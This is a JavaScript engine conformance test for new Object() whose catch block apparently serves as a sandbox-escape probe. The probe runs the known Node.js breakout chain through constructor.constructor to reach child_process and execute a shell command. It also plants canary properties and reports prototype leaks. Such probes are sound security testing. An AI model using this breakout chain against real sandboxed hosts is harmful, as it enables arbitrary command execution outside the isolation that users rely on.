try {
    var constr = Object.prototype.constructor;
    var obj = new constr();
    if (obj === undefined) {
        $ERROR('#0: new Object() return the newly created native object.');
    }
    if (obj.constructor !== Object) {
        $ERROR('#1: new Object() create a new native ECMAScript object');
    }
    if (!Object.prototype.isPrototypeOf(obj)) {
        $ERROR('#2: when new Object() calls the [[Prototype]] property of the newly constructed object is set to the Object prototype object.');
    }
    var to_string_result = '[object ' + 'Object' + ']';
    if (obj.toString() !== to_string_result) {
        $ERROR('#3: when new Object() calls the [[Class]] property of the newly constructed object is set to "Object".');
    }
    if (obj.valueOf().toString() !== to_string_result) {
        $ERROR('#4: when new Object() calls the newly constructed object has no [[Value]] property.');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}